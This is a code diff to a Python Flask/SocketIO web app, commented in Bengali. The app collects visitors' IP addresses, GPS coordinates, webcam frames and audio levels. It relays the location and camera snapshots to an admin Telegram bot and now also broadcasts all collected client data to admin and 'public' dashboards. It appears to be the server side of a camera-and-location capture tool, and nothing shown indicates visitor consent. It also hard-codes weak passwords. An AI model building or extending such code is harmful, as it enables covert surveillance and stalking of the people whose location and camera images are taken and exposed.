@@ -10,36 +10,36 @@ bp = Blueprint('random_route', __name__, url_prefix='/random')
 ADMIN_PASSWORD = 'admin123'
 CLEAR_PASSWORD = 'arif123'
 
-# টেলিগ্রাম কনফিগ – এনভায়রনমেন্ট ভেরিয়েবল থেকে
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
-CHAT_ID = os.environ.get('CHAT_ID')
-BOT_ENABLED = bool(BOT_TOKEN and CHAT_ID)   # True = শুধু টেলিগ্রাম, False = শুধু ড্যাশবোর্ড
+# ========== এডমিন টেলিগ্রাম বট (সার্ভার সাইড) ==========
+ADMIN_BOT_TOKEN = os.environ.get('ADMIN_BOT_TOKEN')   # আলাদা এনভায়রনমেন্ট
+ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID')
+ADMIN_BOT_ENABLED = bool(ADMIN_BOT_TOKEN and ADMIN_CHAT_ID)
 
 clients = {}
 
-def send_telegram(text, photo_bytes=None):
-    if not BOT_ENABLED:
+def send_admin_telegram(text, photo_bytes=None):
+    if not ADMIN_BOT_ENABLED:
         return
     try:
         if photo_bytes:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo_bytes}, timeout=5)
+            url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendPhoto"
+            requests.post(url, data={'chat_id': ADMIN_CHAT_ID}, files={'photo': photo_bytes}, timeout=5)
         else:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            requests.post(url, data={'chat_id': CHAT_ID, 'text': text, 'parse_mode': 'HTML'}, timeout=5)
+            url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
+            requests.post(url, data={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'HTML'}, timeout=5)
     except Exception as e:
-        print(f"Telegram error: {e}")
+        print(f"Admin Telegram error: {e}")
 
 # ========== ওয়েব রাউট ==========
 @bp.route('/')
 def index():
-    return render_template('random_index.html', bot_enabled=BOT_ENABLED)
+    return render_template('random_index.html', admin_bot_enabled=ADMIN_BOT_ENABLED)
 
 @bp.route('/admin')
 def admin():
     if not session.get('admin_logged_in'):
         return redirect(url_for('random_route.admin_login'))
-    return render_template('random_admin.html', bot_enabled=BOT_ENABLED)
+    return render_template('random_admin.html', admin_bot_enabled=ADMIN_BOT_ENABLED)
 
 @bp.route('/admin/login', methods=['GET', 'POST'])
 def admin_login():
@@ -79,10 +79,9 @@ def handle_connect():
         clients[ip]['offline'] = False
         clients[ip]['user_agent'] = ua
 
-    # বট সক্রিয় থাকলে ড্যাশবোর্ডে আপডেট পাঠাবো না
-    if not BOT_ENABLED:
-        emit_admin_update()
-        emit_public_update()
+    # ড্যাশবোর্ডে সব সময় আপডেট পাঠাও (এডমিন বট অন থাকলেও ড্যাশবোর্ড চলবে)
+    emit_admin_update()
+    emit_public_update()
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -93,9 +92,8 @@ def handle_disconnect():
                 data['offline'] = True
                 print(f"📴 User {ip} went offline")
             break
-    if not BOT_ENABLED:
-        emit_admin_update()
-        emit_public_update()
+    emit_admin_update()
+    emit_public_update()
 
 @socketio.on('ready')
 def handle_ready():
@@ -108,11 +106,13 @@ def handle_location(data):
     if ip in clients:
         clients[ip]['location'] = data
         clients[ip]['offline'] = False
-        if BOT_ENABLED:
-            send_telegram(f"📍 Location from {ip}\nLat: {data['lat']}, Lng: {data['lng']}")
-        else:
-            emit_admin_update()
-            emit_public_update()
+        
+        # এডমিন বটে পাঠাও (যদি সক্রিয় থাকে)
+        if ADMIN_BOT_ENABLED:
+            send_admin_telegram(f"📍 Location from {ip}\nLat: {data['lat']}, Lng: {data['lng']}")
+        
+        emit_admin_update()
+        emit_public_update()
 
 @socketio.on('video_frame')
 def handle_video(data):
@@ -124,27 +124,27 @@ def handle_video(data):
         clients[ip]['last_frame'] = image
         clients[ip]['audio_level'] = audio
         clients[ip]['offline'] = False
-        if BOT_ENABLED:
-            # প্রতি ৫ম ফ্রেমে টেলিগ্রামে ফটো পাঠাও (রেট লিমিট এড়াতে)
+        
+        # এডমিন বটে ফটো পাঠাও (প্রতি ৫ম ফ্রেম)
+        if ADMIN_BOT_ENABLED:
             if not hasattr(handle_video, 'counter'):
                 handle_video.counter = 0
             handle_video.counter += 1
             if handle_video.counter % 5 == 0 and image:
                 try:
                     img_bytes = base64.b64decode(image.split(',')[1])
-                    send_telegram(f"🎥 Frame from {ip}\n🔊 Audio: {audio}%", photo_bytes=img_bytes)
+                    send_admin_telegram(f"🎥 Frame from {ip}\n🔊 Audio: {audio}%", photo_bytes=img_bytes)
                 except:
                     pass
-        else:
-            emit_admin_update()
-            emit_public_update()
+        
+        emit_admin_update()
+        emit_public_update()
 
 @socketio.on('admin_join')
 def handle_admin_join():
     join_room('admin_room')
     print(f"🛡️ Admin joined room: {request.sid}")
-    if not BOT_ENABLED:
-        emit('admin_update', clients, to='admin_room')
+    emit('admin_update', clients, to='admin_room')
 
 def emit_admin_update():
     emit('admin_update', clients, to='admin_room')
@@ -170,10 +170,9 @@ def handle_clear(data):
     if data.get('password') == CLEAR_PASSWORD:
         clients.clear()
         emit('clear_all', broadcast=True)
-        if BOT_ENABLED:
-            send_telegram("🗑️ All data cleared by admin")
-        else:
-            emit_admin_update()
+        if ADMIN_BOT_ENABLED:
+            send_admin_telegram("🗑️ All data cleared by admin")
+        emit_admin_update()
         return {'status': 'ok'}
     else:
         return {'status': 'error', 'message': 'Wrong password'}
